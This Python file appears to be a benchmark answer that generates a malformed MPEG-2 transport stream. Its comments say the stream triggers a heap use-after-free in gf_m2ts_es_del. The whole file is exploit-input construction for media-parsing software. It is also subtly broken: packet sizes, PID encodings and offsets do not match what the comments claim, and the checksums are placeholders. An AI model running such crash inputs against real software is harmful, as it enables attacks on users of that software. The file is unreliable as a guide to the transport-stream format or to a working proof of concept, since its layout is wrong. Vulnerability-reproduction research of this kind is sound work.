class Solution:
    def solve(self, src_path: str) -> bytes:
        # Crafted PoC for heap use-after-free in gf_m2ts_es_del
        # This is a minimal M2TS stream with corrupted ES deletion trigger
        poc = bytearray(1128)
        
        # Basic M2TS sync byte and PAT
        poc[0] = 0x47  # Sync byte
        poc[1:4] = [0x40, 0x00, 0x10]  # PID 0, adaptation + payload
        
        # Adaptation field for PCR
        poc[4] = 0x20  # Adaptation length
        poc[5] = 0x10  # PCR flag
        # PCR value (simplified)
        poc[6:14] = [0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
        poc[14] = 0x00  # Stuffing
        
        # PAT payload (program association table)
        poc[15] = 0x00  # Pointer field
        poc[16:20] = [0x00, 0x01, 0xB0, 0x0D]  # Table ID, section syntax, length
        poc[20] = 0x00  # Transport stream ID
        poc[21] = 0x03  # Version and current
        poc[22] = 0x00  # Section number
        poc[23] = 0x00  # Last section
        # Program 1: PMT PID 0x100
        poc[24:28] = [0x00, 0x01, 0x00, 0x50]
        poc[28:32] = [0x00, 0x00, 0x10, 0x00]  # CRC placeholder
        
        # Next packet: PMT (PID 0x100)
        offset = 32
        poc[offset] = 0x47  # Sync
        poc[offset+1:offset+4] = [0x50, 0x00, 0x10]  # PID 0x100
        poc[offset+4] = 0x00  # No adaptation
        poc[offset+5] = 0x00  # Pointer
        # PMT header
        poc[offset+6:offset+10] = [0x02, 0xB0, 0x0F, 0x00]  # Table ID 2, length
        poc[offset+10] = 0x00  # Program number
        poc[offset+11] = 0x03
        poc[offset+12] = 0x00
        poc[offset+13] = 0x00
        # ES: Video PID 0x101, stream type 0x1B (H.264)
        poc[offset+14:offset+18] = [0x1B, 0x00, 0xE0, 0xF0]  # Type, ES ID, PID 0x101
        poc[offset+18:offset+20] = [0xF0, 0x00]  # Descriptors length, PCR PID
        # End of PMT
        poc[offset+20:offset+24] = [0x00, 0x00, 0x00, 0x00]  # CRC
        
        # Introduce ES packets for video stream (PID 0x101)
        offset += 24
        poc[offset] = 0x47
        poc[offset+1:offset+4] = [0x60, 0x00, 0x10]  # PID 0x101, PUSI
        poc[offset+4] = 0x00
        poc[offset+5] = 0x00  # Pointer
        # PES header for ES
        poc[offset+6:offset+14] = [0x00, 0x00, 0x01, 0xE0, 0x00, 0x00, 0x84, 0x80]  # PES start, stream ID, length, flags
        # Corrupt to trigger free: incomplete PES or bad length leading to del on freed mem
        poc[offset+14:offset+188] = [0x00] * 174  # Payload padding
        
        # Multiple packets to build stream, then trigger del
        # Simulate use-after-free by having overlapping or freed ES context
        offset += 188
        for i in range(5):
            poc[offset] = 0x47
            poc[offset+1:offset+4] = [0x60, 0x00, 0x00]  # Continuation
            poc[offset+4:offset+188] = [0x00] * 184
            offset += 188
        
        # Trigger packet: PMT update or PAT that deletes ES but uses after
        poc[offset] = 0x47
        poc[offset+1:offset+4] = [0x50, 0x00, 0x10]  # PMT PID, but modify to del
        # Corrupted PMT that removes ES but references freed structure
        poc[offset+4] = 0x00
        poc[offset+5] = 0x00
        poc[offset+6:offset+10] = [0x02, 0xB0, 0x00, 0x00]  # Short length to corrupt
        # Invalid ES del trigger
        poc[offset+10:offset+24] = [0x1B, 0xF0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
        # Pad rest with zeros or noise to reach 1128
        remaining = 1128 - (offset + 24)
        poc[offset+24:offset+24+remaining] = [0x00] * remaining
        poc[offset+24+remaining:] = [0xFF] * (1128 - len(poc))  # Ensure exact length if needed
        
        return bytes(poc[:1128])